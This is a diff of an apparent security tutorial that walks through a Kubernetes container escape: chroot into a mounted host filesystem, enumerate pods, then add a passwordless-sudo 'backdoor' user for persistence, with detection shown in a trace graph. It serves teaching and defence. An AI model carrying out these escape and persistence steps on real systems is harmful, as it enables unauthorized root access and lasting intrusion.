@@ -15,13 +15,13 @@ In this scenario, the attacker has exploited a vulnerability in an application r
 ```sh
 mount | grep 'host' | head
 ```
-
-At the top of the mount entries, there is a `/host-system` folder. Running `ls` shows what seems to be the host machine's root directory.
-
 ```
 /dev/vda1 on /host-system type ext4 (rw,relatime,discard,errors=no-relo)
 # ...
 ```
+
+At the top of the mount entries, there is a `/host-system` folder. Running `ls` shows what seems to be the host machine's root directory.
+
 ```sh
 ls /host-system/
 ```
@@ -29,11 +29,13 @@ ls /host-system/
 CHANGELOG  bin  boot  data  dev  etc  home  hosthome  init  lib  lib64  libexec  linuxrc  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  version.json
 ```
 
-Additionally, running `capsh` shows that we have the chroot permission, allowing us to change our root to act like we are in the mounted host system:
+Additionally, running `capsh` shows that we have the chroot permission:
 
 ```sh
 capsh --print | grep chroot
 ```
+
+This allows us to change our root to act like we are in the mounted host system:
 
 ```sh
 chroot /host-system bash
@@ -48,7 +50,7 @@ which PROGRAM
 <details>
     <summary>If <code>docker</code> is installed</summary>
 
-With docker, we can see all of the pods that are running on the node:
+With Docker, we can see all of the pods that are running on the node:
 
 ```sh
 docker ps
@@ -73,8 +75,6 @@ At this point, we could `exec` into one of these containers and try to extract i
 
 <details>
     <summary>If <code>crictl</code> is installed</summary>
-
-For this exercise, let's investigate the running pods and containers with `crictl`, then create persistence with a new user.
 
 `crictl` is an alternative command-line control to docker that integrates with Kubernetes. To start, let's use it to list the available pods:
 
@@ -118,7 +118,9 @@ If we don't have the tools we need, that doesn't matter: we have root access. Th
 apt install docker
 ```
 
-> Note: the package installer and package may vary depending on the machine. Try `yum` or `apk` if `apt` isn't available. If the package is not found, try searching for it or updating the package list (`apt update`).
+> **Note:**
+> 
+> The package installer and package may vary depending on the machine. Try `yum` or `apk` if `apt` isn't available. If the package is not found, try searching for it or updating the package list (`apt update`).
 
 </details>
 
@@ -146,7 +148,7 @@ User backdoor may run the following commands on system-monitor-deployment-5d49dd
     (ALL) NOPASSWD: ALL
 ```
 
-From here, we could then install ssh keys for the backdoor user.
+From here, we could then install ssh keys for the backdoor user or provide some other method of persistent access, such as a Cron job or systemd service.
 
 In summary, we gained access to a vulnerable Kubernetes container and exploited its excessive access to gain root privileges on the host machine. From there, we investigated all containers running on this node and created a backdoor user with root access for persistence.
 
@@ -157,7 +159,7 @@ Performing this exploit will trigger several red flags that are detected and col
 
 ![A section of the Spydertrace featuring one of my chroot commands](./chroot_flag_graph.png)
 
-Here, we can clearly see the interactive Bash shell at the top of the container (the shaded box). Underneath, we can see the attacker running some investigation commands, escaping with the `chroot` command, and later investigating with `crictl` and creating persistence with `adduser`.
+Here, we can clearly see the interactive Bash shell at the top of the container (the shaded box). Underneath, we can see the attacker running some investigation commands, escaping with the `chroot` command, later investigating with `crictl`, and creating persistence with `adduser`.
 
 ## Next Steps
 
